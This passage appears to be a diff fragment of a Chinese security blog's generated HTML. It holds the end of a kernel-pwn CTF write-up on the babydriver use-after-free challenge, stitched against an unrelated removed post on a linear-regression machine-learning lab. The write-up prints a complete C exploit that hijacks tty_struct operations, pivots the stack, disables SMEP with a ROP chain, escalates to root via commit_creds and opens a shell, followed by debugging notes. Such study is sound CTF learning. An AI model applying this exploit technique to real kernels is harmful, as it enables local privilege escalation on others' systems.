&amp;prepare_kernel_cred);</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;prepare_kernel_cred addr: %p\n&quot;</span>, prepare_kernel_cred);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!(prepare_kernel_cred &amp; commit_creds))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[*]Error!&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">	find_symbols();</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">/ $ /tmp/find </span><br><span class="line">commit_creds addr: <span class="number">0xffffffff810a1420</span></span><br><span class="line">prepare_kernel_cred addr: <span class="number">0xffffffff810a1810</span></span><br></pre></td></tr></table></figure>
+<p>接下来就说一下攻击的原理：</p>
+<ul>
+<li>先通过 uaf 控制一个 <code>tty_struct</code> 结构（在 <code>open(&quot;/dev/ptmx&quot;, O_RDWR)</code> 时会分配）</li>
+<li><code>tty_struct-&gt;tty_operations</code> 中有许多函数指针可以用来劫持</li>
+<li>进行 stack pivot（栈迁移）到 rop 链的空间</li>
+</ul>
+<p>官方exp：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> prepare_kernel_cred_addr 0xffffffff810a1810</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> commit_creds_addr 0xffffffff810a1420</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">void</span>* fake_tty_operations[<span class="number">30</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">size_t</span> user_cs, user_ss, user_rflags, user_sp;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">save_status</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	__asm__(<span class="string">&quot;mov user_cs, cs;&quot;</span></span><br><span class="line">			<span class="string">&quot;mov user_ss, ss;&quot;</span></span><br><span class="line">			<span class="string">&quot;mov user_sp, rsp;&quot;</span></span><br><span class="line">			<span class="string">&quot;pushf;&quot;</span></span><br><span class="line">			<span class="string">&quot;pop user_rflags;&quot;</span></span><br><span class="line">			);</span><br><span class="line">	<span class="built_in">puts</span>(<span class="string">&quot;[*]status has been saved.&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">get_shell</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">get_root</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span>* (*pkc)(<span class="keyword">int</span>) = prepare_kernel_cred_addr;</span><br><span class="line">    <span class="keyword">void</span> (*cc)(<span class="keyword">char</span>*) = commit_creds_addr;</span><br><span class="line">    (*cc)((*pkc)(<span class="number">0</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    save_status();</span><br><span class="line"></span><br><span class="line">	<span class="keyword">int</span> i = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">size_t</span> rop[<span class="number">32</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    rop[i++] = <span class="number">0xffffffff810d238d</span>;		<span class="comment">// pop rdi; ret;</span></span><br><span class="line">    rop[i++] = <span class="number">0x6f0</span>;</span><br><span class="line">    rop[i++] = <span class="number">0xffffffff81004d80</span>;		<span class="comment">// mov cr4, rdi; pop rbp; ret;</span></span><br><span class="line">    rop[i++] = <span class="number">0</span>;</span><br><span class="line">    rop[i++] = (<span class="keyword">size_t</span>)get_root;</span><br><span class="line">    rop[i++] = <span class="number">0xffffffff81063694</span>;		<span class="comment">// swapgs; pop rbp; ret;</span></span><br><span class="line">    rop[i++] = <span class="number">0</span>;</span><br><span class="line">    rop[i++] = <span class="number">0xffffffff814e35ef</span>;		<span class="comment">// iretq; ret;</span></span><br><span class="line">    rop[i++] = (<span class="keyword">size_t</span>)get_shell;</span><br><span class="line">    rop[i++] = user_cs;                <span class="comment">/* saved CS */</span></span><br><span class="line">    rop[i++] = user_rflags;            <span class="comment">/* saved EFLAGS */</span></span><br><span class="line">    rop[i++] = user_sp;</span><br><span class="line">    rop[i++] = user_ss;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">30</span>; i++)</span><br><span class="line">	&#123;</span><br><span class="line">		fake_tty_operations[i] = <span class="number">0xFFFFFFFF8181BFC5</span>;</span><br><span class="line">	&#125;</span><br><span class="line">    fake_tty_operations[<span class="number">0</span>] = <span class="number">0xffffffff810635f5</span>; <span class="comment">// pop rax; pop rbp; ret;</span></span><br><span class="line">    fake_tty_operations[<span class="number">1</span>] = (<span class="keyword">size_t</span>)rop;</span><br><span class="line">    fake_tty_operations[<span class="number">3</span>] = <span class="number">0xFFFFFFFF8181BFC5</span>; <span class="comment">// mov rsp,rax ; dec ebx ; ret</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> fd1 = open(<span class="string">&quot;/dev/babydev&quot;</span>, O_RDWR);</span><br><span class="line">    <span class="keyword">int</span> fd2 = open(<span class="string">&quot;/dev/babydev&quot;</span>, O_RDWR);</span><br><span class="line">    ioctl(fd1, <span class="number">0x10001</span>, <span class="number">0x2e0</span>);</span><br><span class="line">    close(fd1);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">int</span> fd_tty = open(<span class="string">&quot;/dev/ptmx&quot;</span>, O_RDWR|O_NOCTTY); <span class="comment">// tty_struct已经申请到babydev_struct中</span></span><br><span class="line">    <span class="keyword">size_t</span> fake_tty_struct[<span class="number">4</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    read(fd2, fake_tty_struct, <span class="number">32</span>); <span class="comment">// 把tty_struct读取到fake_tty_struct</span></span><br><span class="line">    fake_tty_struct[<span class="number">3</span>] = (<span class="keyword">size_t</span>)fake_tty_operations; <span class="comment">// 修改tty_operations指向fake_tty_operations</span></span><br><span class="line">    write(fd2,fake_tty_struct, <span class="number">32</span>); <span class="comment">// 用fake_tty_struct覆盖tty_struct</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">char</span> buf[<span class="number">0x8</span>] = &#123;<span class="number">0</span>&#125;; <span class="comment">// buf压栈,作为栈迁移的跳板</span></span><br><span class="line">    write(fd_tty, buf, <span class="number">8</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>为了理解这个 exp，我们调试一下：</p>
+<ul>
+<li>获取 babydrive 模块的加载地址：（在 “/sys/module/” 中是加载的各个模块的信息）</li>
+</ul>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/ $ cat /sys/<span class="keyword">module</span>/babydriver/sections/.text </span><br><span class="line"><span class="number">0xffffffffc0000000</span></span><br></pre></td></tr></table></figure>
+<ul>
+<li>使用 add-symbol-file 添加符号</li>
+</ul>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; add-symbol-file babydriver.ko <span class="number">0xffffffffc0000000</span></span><br><span class="line">add symbol table from file <span class="string">&quot;babydriver.ko&quot;</span> at</span><br><span class="line">	.text_addr = <span class="number">0xffffffffc0000000</span></span><br><span class="line">Reading symbols from babydriver.ko...</span><br></pre></td></tr></table></figure>
+<img src="/2022/05/17/kernel%20UAF/1653064701599.png" class width="1653064701599"> 
+<ul>
+<li>在执行“write(fd_tty, buf, 8)”（“fake_tty_operations[7]-0xffffffff8181bfc5”）前停止</li>
+<li>此时RAX为：“fake_tty_operations[0]-0xffffffff810635f5”（通过这个“rax + 0x38”可以看出来）</li>
+<li>接下来就会执行：“mov rsp,rax ; dec ebx ; ret”（“fake_tty_operations[7]-0xffffffff8181bfc5”）</li>
+<li>栈迁移为：“fake_tty_operations[0]-0xffffffff810635f5”</li>
+<li>接着“ret”执行ROP链（“fake_tty_operations[1]”）</li>
+<li>最后在ROP链中 <strong>bypass-smep</strong>，并且用 ret2usr 进行提权</li>
+</ul>
+<p>这里我要吐槽一句：kernel 的调试实在是太慢了，“ni”要足足执行一秒钟，还有这个 exp 是打不通的，必须把 boot.sh 中的 -enable-kvm 去掉才可以打通（快搞死我了）</p>
+<hr>
+<p><strong>小结：</strong></p>
+<p>这是我的第二个 kernel pwn，感觉顺畅多了，这个题目给我提供了另一个提权的思路：UAF</p>
+<p>目前有许多概念很是陌生，比如这个“cdev结构体”，我感觉它和 ucore 中的“vdev结构体”很像，但是就是不了解“cdev结构体”与其背后的机制</p>
+<p>从 ucore 到 Linux 还是有距离的，那天抽时间整理一下 Linux 内核的知识</p>
+<p>还有 kernel 是真的不好调试，太慢了</p>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
     <link itemprop="mainEntityOfPage" href="http://example.com/2022/05/17/Machine-Learning-Lab5/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -2590,218 +2805,6 @@ J(θ)=-\frac1{m}[\sum_{i=1}^my^{(i)}log\,h_θ(x^{(i)})+(1-y^{(i)})log(1-h_θ(x^{
   
   
 
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
-    <link itemprop="mainEntityOfPage" href="http://example.com/2022/05/05/Machine-Learning-Lab1/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="yhellow">
-      <meta itemprop="description" content="">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Pwn进你的心">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2022/05/05/Machine-Learning-Lab1/" class="post-title-link" itemprop="url">Machine-Learning-Lab1</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-calendar"></i>
-              </span>
-              <span class="post-meta-item-text">Posted on</span>
-
-              <time title="Created: 2022-05-05 22:03:26" itemprop="dateCreated datePublished" datetime="2022-05-05T22:03:26+08:00">2022-05-05</time>
-            </span>
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="far fa-calendar-check"></i>
-                </span>
-                <span class="post-meta-item-text">Edited on</span>
-                <time title="Modified: 2022-05-08 18:36:19" itemprop="dateModified" datetime="2022-05-08T18:36:19+08:00">2022-05-08</time>
-              </span>
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="far fa-folder"></i>
-              </span>
-              <span class="post-meta-item-text">In</span>
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/AI/" itemprop="url" rel="index"><span itemprop="name">AI</span></a>
-                </span>
-            </span>
-
-          
-            <span class="post-meta-item" title="Symbols count in article">
-              <span class="post-meta-item-icon">
-                <i class="far fa-file-word"></i>
-              </span>
-              <span>7.6k</span>
-            </span>
-            <span class="post-meta-item" title="Reading time">
-              <span class="post-meta-item-icon">
-                <i class="far fa-clock"></i>
-              </span>
-              <span>7 mins.</span>
-            </span>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <h2 id="实验介绍"><a href="#实验介绍" class="headerlink" title="实验介绍"></a>实验介绍</h2><p>在本练习中，您将实现线性回归，并了解它的工作原理</p>
-<p>实验文件：</p>
-<ul>
-<li>ex1.m - Octave/MATLAB脚本，帮助您完成练习</li>
-<li>ex1 multi.m - 多个 Octave/MATLAB 脚本，用于练习的后续部分</li>
-<li>ex1data1.txt - txt-单变量线性回归数据集</li>
-<li>ex1data2.txt - txt-多变量线性回归数据集</li>
-<li>submit.m - 将您的解决方案发送到我们的服务器</li>
-<li>[?] warmUpExercise.m - Octave/MATLAB中的简单示例函数</li>
-<li>[?] plotData.m - 用来显示数据集的函数</li>
-<li>[?] computeCost.m - 用来计算线性回归的成本的函数</li>
-<li>[?] gradientDescent.m - 用来运行梯度下降的函数</li>
-<li>[†] computeCostMulti.m - 多变量代价函数</li>
-<li>[†] gradientDescentMulti.m - 多变量梯度下降</li>
-<li>[†] featureNormalize.m - 用于规范化特征的函数</li>
-<li>[†] normalEqn.m - 用于计算正规方程组的函数</li>
-</ul>
-<p>在整个练习中，您将使用 ex1.m 和 ex1 multi.m，这些脚本为问题设置数据集，并调用将要编写的函数，您不需要修改它们中的任何一个，您只需按照本任务中的说明修改其他文件中的函数</p>
-<p>对于这个编程练习，您只需要完成练习的第一部分，就可以使用一个变量实现线性回归，练习的第二部分是可选的，内容包括使用多变量</p>
-<p>PS：由于本人不会使用 Octave，以下实验是在 github 上找的 python 版本</p>
-<h2 id="Linear-regression-with-one-variable（单变量线性回归）"><a href="#Linear-regression-with-one-variable（单变量线性回归）" class="headerlink" title="Linear regression with one variable（单变量线性回归）"></a>Linear regression with one variable（单变量线性回归）</h2><p>在本练习的这一部分中，您将使用一个变量实现线性回归，以预测食品卡车的利润：</p>
-<ul>
-<li>假设你是一家连锁餐厅的首席执行官，正在考虑在不同的城市开设一家新的分店</li>
-<li>这家连锁店在各个城市都有卡车，你可以从这些城市获得利润和人口数据</li>
-<li>您希望使用这些数据来帮助您选择下一步要扩展到哪个城市<ul>
-<li>文件 ex1data1.txt 包含线性回归问题的数据集（第一列是一个城市的人口，第二列是该城市食品卡车的利润，利润为负值表示亏损）</li>
-<li>脚本 ex1.m 已经被设置好你需要加载的这些数据</li>
-</ul>
-</li>
-</ul>
-<h2 id="Plotting-the-Data-A（绘制数据）"><a href="#Plotting-the-Data-A（绘制数据）" class="headerlink" title="Plotting the Data A（绘制数据）"></a>Plotting the Data A（绘制数据）</h2><p>在开始任何任务之前，通过可视化来理解数据通常是有用的</p>
-<p>对于这个数据集，您可以使用散点图来可视化数据，因为它只有两个属性需要绘制 - 利润和人口（你在现实生活中会遇到的许多其他问题都是多维的，无法绘制在二维图上）</p>
-<ul>
-<li>在 ex1.m 中，数据集从数据文件加载到了变量X和Y中：</li>
-</ul>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> matplotlib.pyplot <span class="keyword">as</span> plt <span class="comment"># as相当于加了一个别称(这个类不用实例化)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># ======== 1.载入数据和绘制散点图 ========</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;读取数据，并绘制散点图...\n&#x27;</span>)</span><br><span class="line">filepath = <span class="string">r&#x27;data\ex1data1.txt&#x27;</span></span><br><span class="line"><span class="comment"># 从文件中读取数据,第一列是城市的人口,第二列是该城市食品卡车的利润,中间用&#x27;,&#x27;作为分隔符</span></span><br><span class="line">dataset = np.loadtxt(filepath, delimiter=<span class="string">&#x27;,&#x27;</span>, usecols=(<span class="number">0</span>,<span class="number">1</span>)) </span><br><span class="line"><span class="comment"># filepath: 文件路径</span></span><br><span class="line"><span class="comment"># delimiter: 分隔符</span></span><br><span class="line"><span class="comment"># usecols: 选取数据的列编号</span></span><br><span class="line">Xdata = dataset[:,<span class="number">0</span>] <span class="comment"># 获取第一列的数据-城市的人口(因)</span></span><br><span class="line">Ydata = dataset[:,<span class="number">1</span>] <span class="comment"># 获取第二列的数据-卡车的利润(果)</span></span><br><span class="line">plt.figure(<span class="number">0</span>) <span class="comment"># 初始化图表(命名其为&quot;0&quot;)</span></span><br><span class="line">plt.scatter(Xdata,Ydata,c=<span class="string">&#x27;red&#x27;</span>,marker=<span class="string">&#x27;o&#x27;</span>,s=<span class="number">20</span>) <span class="comment"># 设置图表上的断点</span></span><br><span class="line">plt.xlabel(<span class="string">&#x27;Population of City in 10,000s&#x27;</span>,fontsize=<span class="number">10</span>) <span class="comment"># 设置x轴上的文字</span></span><br><span class="line">plt.ylabel(<span class="string">&#x27;Profit of City in $10,000&#x27;</span>,fontsize=<span class="number">10</span>) <span class="comment"># 设置y轴上的文字</span></span><br><span class="line">plt.legend([<span class="string">&#x27;Data Point&#x27;</span>]) <span class="comment"># 设置左上角的注释</span></span><br><span class="line">plt.show() <span class="comment"># 显示该图表</span></span><br></pre></td></tr></table></figure>
-<ul>
-<li>loadtxt(filepath , delimiter , usecols)：从文件路径 filepath 中读取第 usecols 列的数据，以 delimiter 为数据之间的间隔</li>
-</ul>
-<p>这里使用了 Matplotlib Pyplot 模块（Pyplot 是常用的绘图模块，能很方便让用户绘制 2D 图表）</p>
-<img src="/2022/05/05/Machine-Learning-Lab1/1651680796631-1652006179447.png" class width="1651680796631"> 
-<p><strong>Gradient Descent（梯度下降）</strong></p>
-<ul>
-<li>算法原理：</li>
-</ul>
-<script type="math/tex; mode=display">
-repeat\,\,\, until\,\,\, convergence\{ 
-\\
-θ_j:=θ_j-\alpha\frac∂{∂θ_j}J(θ_0,θ_1)\quad(for\,\,\,j=0\,\,\,and\,\,\,j=1)
-\\
-\}</script><ul>
-<li>代码实现：</li>
-</ul>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"><span class="keyword">from</span> computeCost <span class="keyword">import</span> compute_cost</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">gradient_descent</span>(<span class="params">X,Y,theta_init,alpha,iter_num</span>):</span></span><br><span class="line">    <span class="comment"># X: 城市的人口(添加有偏置维度)</span></span><br><span class="line">    <span class="comment"># Y: 卡车的利润</span></span><br><span class="line">    <span class="comment"># theta_init: 参数θ(初始值)</span></span><br><span class="line">    <span class="comment"># alpha: 学习率α</span></span><br><span class="line">    <span class="comment"># iter_num: 迭代次数iter</span></span><br><span class="line">    m = Y.shape[<span class="number">0</span>] </span><br><span class="line">    J_history = np.zeros(iter_num) <span class="comment"># 用于记录代价的历史值</span></span><br><span class="line">    theta = theta_init</span><br><span class="line">    <span class="keyword">for</span> num <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,iter_num): </span><br><span class="line">        J_history[num] = compute_cost(X,Y,theta) <span class="comment"># 用代价函数计算代价并记录</span></span><br><span class="line">        hyp = np.dot(X,np.transpose(theta))</span><br><span class="line">        theta = theta - alpha * np.dot(np.transpose(hyp -Y),X) / m </span><br><span class="line">    <span class="keyword">return</span> theta,J_history <span class="comment"># 返回&quot;参数θ(已改变)&quot;和&quot;代价的历史值&quot;</span></span><br></pre></td></tr></table></figure>
-<ul>
-<li>zeros()：返回来一个给定形状和类型的，用“0”填充的数组</li>
-<li>shape()：它的功能是读取矩阵的长度，比如 “shape[0]” 就是读取矩阵第一维度的长度</li>
-</ul>
-<p><strong>Mean squared error（代价函数-均方误差）</strong></p>
-<ul>
-<li>算法原理：</li>
-</ul>
-<script type="math/tex; mode=display">
-J(θ_0,θ_1)=
-\frac1{2m}\sum_{i=1}^m(\hat y^{(i)}−y^{(i)})^2=
-\frac1{2m}\sum_{i=1}^m(h_θ(x^{(i)})−y^{(i)})^2</script><ul>
-<li>代码实现：</li>
-</ul>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">compute_cost</span>(<span class="params">X,Y,theta</span>):</span></span><br><span class="line">    <span class="comment"># X: 城市的人口(添加有偏置维度)</span></span><br><span class="line">    <span class="comment"># Y: 卡车的利润</span></span><br><span class="line">    <span class="comment"># theta: 参数θ(已改变)</span></span><br><span class="line">	hypthesis = np.dot(X,np.transpose(theta))</span><br><span class="line">	cost = np.dot(np.transpose(hypthesis - Y),(hypthesis -Y))</span><br><span class="line">	cost = cost / (<span class="number">2</span> * X.shape[<span class="number">0</span>])</span><br><span class="line">	<span class="keyword">return</span> cost</span><br></pre></td></tr></table></figure>
-<ul>
-<li>dot(x , y)：两个数组作矩阵乘积，当两个数组的维度不能直接进行矩阵乘法时，dot会把尝试后面的参数进行转置</li>
-<li>transpose(x)：把矩阵进行转置</li>
-</ul>
-<p><strong>Completion process（具体的拟合过程）</strong></p>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np</span><br><span class="line"></span><br><span class="line"><span class="comment"># ======== 2.计算代价和梯度 ========</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;进行梯度计算...\n&#x27;</span>)</span><br><span class="line">X = np.c_[np.ones(Xdata.shape[<span class="number">0</span>]),Xdata] <span class="comment"># 给输入数据Xdata增加一个偏置维度</span></span><br><span class="line">Y = Ydata</span><br><span class="line">theta_init = np.zeros(X.shape[<span class="number">1</span>]) <span class="comment"># 初始化(θ,参数)</span></span><br><span class="line">iter_num = <span class="number">1500</span> <span class="comment"># 初始化(iter,迭代次数)</span></span><br><span class="line">alpha = <span class="number">0.01</span> <span class="comment"># 初始化(α,学习率)</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;Initial cost:&#x27;</span>, <span class="built_in">str</span>(compute_cost(X,Y,theta_init)), <span class="string">&#x27;\nThis value should be 32.07&#x27;</span>) <span class="comment"># 利用代价函数计算初始代价</span></span><br><span class="line">theta_fin,J_history = gradient_descent(X,Y,theta_init,alpha,iter_num) <span class="comment"># 利用梯度下降法进行优化求解,返回记录代价历史值的J_history,和最终θ(theta_fin)</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;Theta found by gradient descent:&#x27;</span>,<span class="built_in">str</span>(theta_fin.reshape(<span class="number">2</span>)))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 绘制数据散点图和线性回归曲线</span></span><br><span class="line">plt.figure(<span class="number">1</span>)</span><br><span class="line">plt.scatter(Xdata,Ydata,c=<span class="string">&#x27;red&#x27;</span>,marker=<span class="string">&#x27;o&#x27;</span>,s=<span class="number">20</span>)</span><br><span class="line">plt.plot(X[:,<span class="number">1</span>],np.dot(X,theta_fin),<span class="string">&#x27;b-&#x27;</span>,lw=<span class="number">3</span>)</span><br><span class="line">plt.xlabel(<span class="string">&#x27;Population of City in 10,000s&#x27;</span>,fontsize=<span class="number">10</span>)</span><br><span class="line">plt.ylabel(<span class="string">&#x27;Profit of City in $10,000&#x27;</span>,fontsize=<span class="number">10</span>)</span><br><span class="line">plt.legend([<span class="string">&#x27;Data Point&#x27;</span>,<span class="string">&#x27;Linear Regression&#x27;</span>])</span><br><span class="line">plt.show()</span><br></pre></td></tr></table></figure>
-<ul>
-<li><p>ones(shape  ,  dtype=None  ,  order=’C’)：返回给定形状和数据类型的新数组</p>
-</li>
-<li><p>c_[ x , y ]：按列叠加两个矩阵，把两个矩阵左右组合，要求行数相等</p>
-</li>
-</ul>
-<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">x_1 = </span><br><span class="line"> [[<span class="number">1</span> <span class="number">2</span> <span class="number">3</span>]</span><br><span class="line">  [<span class="number">4</span> <span class="number">5</span> <span class="number">6</span>]]</span><br><span class="line">x_2 = </span><br><span class="line"> [[<span class="number">3</span> <span class="number">2</span> <span class="number">1</span>]</span><br><span class="line">  [<span class="number">8</span> <span class="number">9</span> <span class="number">6</span>]]</span><br><span class="line">x_new = </span><br><span class="line"> [[<span class="number">1</span> <span class="number">2</span> <span class="number">3</span> <span class="number">3</span> <span class="number">2</span> <span class="number">1</span>]</span><br><span class="line">  [<span class="number">4</span> <span class="number">5</span> <span class="number">6</span> <span class="number">8</span> <span class="number">9</span> <span class="number">6</span>]]</span><br></pre></td></tr></table></figure>
-<img src="/2022/05/05/Machine-Learning-Lab1/1651746868359-1652006179447.png" class width="1651746868359"> 
-<h2 id="Visualizing-J-θ-（可视化代价函数的执行过程）"><a href="#Visualizing-J-θ-（可视化代价函数的执行过程）" class="headerlink" title="Visualizing J(θ)（可视化代价函数的执行过程）"></a>Visualizing J(θ)（可视化代价函数的执行过程）</h2><p>为了更好地理解代价函数 J（θ），我们将生成 J（θ）的曲面和等高线图</p>
